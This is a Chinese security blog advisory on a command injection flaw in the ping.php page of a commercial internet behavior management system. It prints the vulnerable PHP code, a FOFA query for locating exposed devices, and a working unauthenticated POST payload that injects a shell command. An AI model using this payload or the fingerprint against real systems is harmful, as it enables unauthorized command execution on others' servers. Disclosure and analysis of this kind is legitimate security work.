---
title: "汉塔科技上网行为管理系统 ping.php 命令注入漏洞"
source: https://mrxn.net/jswz/antasys-dgn_tools-ping-rce.html
asset_dir: assets/汉塔科技上网行为管理系统-ping.php-命令注入漏洞
---

# 汉塔科技上网行为管理系统 ping.php 命令注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/31 08:34
- 1219浏览
- [0评论](#comment)
- 12分钟阅读

---

# 漏洞简介

汉塔科技 - 上网行为管理系统是上海汉塔网络科技有限公司开发的一款上网行为流量管理系统。其系统 `ping.php` 存在[命令注入](https://mrxn.net/tag/rce)漏洞，未授权攻击者可利用此漏洞在服务器上[执行](https://mrxn.net/tag/rce)任意系统命令，造成系统失陷、敏感数据泄露等高危风险。

网络监控与管理

# 影响版本

# fofa语法

> `body="Antasys"`

# 漏洞分析

> 系统比较古老，使用的是威盾PHP混淆加密，可以参考[这篇文章](https://mrxn.net/jswz/antasys-dgn_tools-tracert-rce.html)附录部分代码进行批量解密或者使用参考链接部分进行在线单个文件解密。

直接看 `dgn/dgn_tools/ping.php` 的业务逻辑实现关键部分

```
<?php

$to_ping = $_REQUEST['ipdm'];
$count = $_REQUEST['cnt'];
$psize = $_REQUEST['ps'];
$loop = 1;
$output = "";
flush();
while ($loop--) {
    exec("ping -c $count -s $psize $to_ping", $list);
    if (count($list) == 0) $output .= "Bad option!";
    else {
        for ($i = 0; $i < count($list); $i++) {
            $output .= $list[$i] . "\r\n";
            $output .= "<br>";
            flush();
        }
    }
    flush();
    sleep(3);
}
echo $output;;
echo ' 
'; ?>
```

通过 `$_REQUEST` 超全局变量获取 `ipdm` 、`ps` 和 `cnt` 参数值后，就直接拼接进 exec 函数进行[命令执行](https://mrxn.net/tag/rce)，无任何过滤，造成命令注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /dgn/dgn_tools/ping.php HTTP/1.1
Host: antasys.test
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded

ipdm=127.1&cnt=1;id;%20%23%20&ps=10
```

三个个参数均存在命令注入

代码安全审计

## cnt

[![汉塔科技上网行为管理系统 ping.php 命令注入漏洞](images/img-001-e4580f3f9da1.webp)](https://image.mrxn.net/9c1624f44712451a8c7ca95515510294.webp)

## ps

[![汉塔科技上网行为管理系统 ping.php 命令注入漏洞](images/img-002-ca1fdd3a1a5e.webp)](https://image.mrxn.net/efbc80ce4700475ca23ca900fa3456c4.webp)

## ipdm

[![汉塔科技上网行为管理系统 ping.php 命令注入漏洞](images/img-003-d3022e1738d8.webp)](https://image.mrxn.net/f379983552654d07ab4a88eeb20dfed1.webp)

都是可以成功执行命令并回显结果。

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.cnt](#toc-5-1-)
- [5.2.ps](#toc-5-2-)
- [5.3.ipdm](#toc-5-3-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
